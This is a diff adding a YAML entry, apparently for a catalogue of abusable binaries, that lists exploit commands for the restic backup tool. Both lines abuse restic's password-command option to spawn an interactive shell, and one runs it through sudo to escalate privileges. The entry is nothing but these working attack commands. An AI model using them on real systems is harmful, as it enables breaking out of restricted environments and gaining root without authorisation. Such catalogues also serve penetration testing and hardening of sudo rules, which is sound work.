@@ -1,0 +1,5 @@
+name: restic
+binary_path: /usr/bin/restic
+exploit_cmds:
+- RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' /usr/bin/restic backup
+- sudo /usr/bin/restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
